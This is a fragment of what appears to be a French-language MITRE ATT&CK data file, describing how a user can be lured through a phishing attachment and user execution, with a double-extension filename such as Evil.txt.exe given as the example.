          me d\u2019un utilisateur via [Pi\xE8ce jointe pour hame\xE7onnage criminel](https://attack.mitre.org/techniques/T1566/001)\
          \ puis [Ex\xE9cution par l\u2019utilisateur](https://attack.mitre.org/techniques/T1204).\
          \ Par exemple, une pi\xE8ce jointe de fichier ex\xE9cutable nomm\xE9e <code>Evil.txt.exe</code>\
